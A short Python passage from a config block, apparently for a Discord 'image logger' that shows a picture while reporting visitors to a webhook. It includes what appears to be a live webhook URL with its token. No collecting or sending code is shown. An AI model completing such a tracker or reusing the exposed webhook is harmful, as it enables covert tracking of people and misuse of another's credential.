...
config = {
    "webhook": "https://discord.com/api/webhooks/1130786694187208795/c_ASp64zJtDJChgGsi8wuCk0Lap9vcFHkff-jqu42zRhe34jq6ltiPOpmoMPMPaYHLmb", # <------------------------- Put your webhook link here.
    "image": "https://pbs.twimg.com/media/FGkc1peWQAIg-PI?format=png&name=large", # <------------------------- Put image address link here.
    "imageArgument": True,
